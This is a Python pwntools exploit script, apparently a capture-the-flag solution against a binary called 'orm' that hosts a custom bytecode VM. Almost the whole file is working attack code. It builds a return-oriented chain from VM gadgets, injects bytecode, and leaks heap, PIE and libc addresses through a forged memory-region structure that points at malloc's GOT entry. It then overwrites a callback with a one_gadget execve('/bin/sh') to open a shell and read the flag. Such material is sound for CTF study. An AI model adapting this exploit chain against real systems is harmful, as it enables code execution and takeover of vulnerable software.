import time
from phase1 import do_rop
from pwn import p64, u64, context, ELF

'''gadgets
pushrf; retb
8080808080808059:	0b                         	pushrf
808080808080805a:	d6                         	retb

popb; retb;
8080808080808668:	14                         	popb
8080808080808669:	d6                         	retb

80808080808083b9:	08 00 00 00 00 00 00 00 00 	pushcf 0
80808080808083c2:	d0 01 00 00 00 80 00 00 00 	call read
80808080808083cb:	08 00 a0 a0 a0 a0 a0 a0 a0 	pushcf readbuf
80808080808083d4:	d0 81 02 00 00 80 00 00 00 	call atoi
'''


popbrb = 0x8080808080808668
pushfrb = 0x8080808080808059
do_read = 0x80808080808083b9
npc = 0x80808080808083cb
npc_align = npc & 7
halt = 0x8080808080808671

e = ELF('../dist/orm')
libc = ELF('libc')

pay = [
        p64(popbrb),
        p64(0x4141414141414140),  # size big enough size)
        p64(pushfrb),
        p64(popbrb),
        p64(npc - npc_align),   # buf
        p64(pushfrb),
        p64(do_read),
        p64(halt),
    ]

r = do_rop(True)(pay)
''' Memory Segments
1. 0x1f10000
2. 0x9000000000
3. 0x8000000000
4. 9090909090909000
5. a0a0a0a0a0a0a000
6. 8080808080808000
'''

# Now we can execute arbitrary code.
with open('sol.ormb', 'rb') as f:
    code = f.read()

time.sleep(1)
r.sendline(code)
time.sleep(1)
fake = ('\x47'*0x11 + p64(0x909090909090a000) + p64(0x1000000))
r.send(fake)
heap = u64(r.recvuntil('AAAA')[1:-4]) - 0x4550

time.sleep(1)
r.sendline('')
base = u64(r.recvuntil('AAAA')[:-4]) - 0x10487 # offset of locked

time.sleep(1)
malloc_got = base + e.got['malloc']

# Build the binary-mapped page.
region = p64(0x0)                 # base 0
region += p64(0x1000)             # length 8
region += p64(7)                  # perm 10
region += p64(0)                  # cb->cb_head 18
region += p64(0)                  # cb->cb_tail 20
region += p64(0x41424344)         # aux 28
region += p64(heap + 0x2440)      # next 30
region += p64(malloc_got)         # 38

r.send('A' * 0x11 + region)

libc_base = u64(r.recvuntil('AAAA')[:-4]) - libc.symbols['malloc']

# Leak the addresses
print '[+] heap: %lx' % heap
print '[+] pie_base: %lx' % base
print '[+] libc: %lx' % libc_base

''' one_gaget
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
rsp & 0xf == 0
rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
[rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL'''

time.sleep(1)

# Finally overwrite the callback to get shell
one_gadget = libc_base + 0x4f322
region = p64(0x0)             # base 0
region += p64(0x1000)         # length 8
region += p64(7)              # perm 10
region += p64(one_gadget)     # cb->cb_head 18
region += p64(0)              # cb->cb_tail 20
region += p64(0)              # aux 28
region += p64(heap + 0x2440)  # next 30
region += p64(malloc_got)     # 38

# bomb!
r.send('A' * 0x11 + region)

time.sleep(1)
r.sendline('cat /home/orm/flag')
r.interactive()
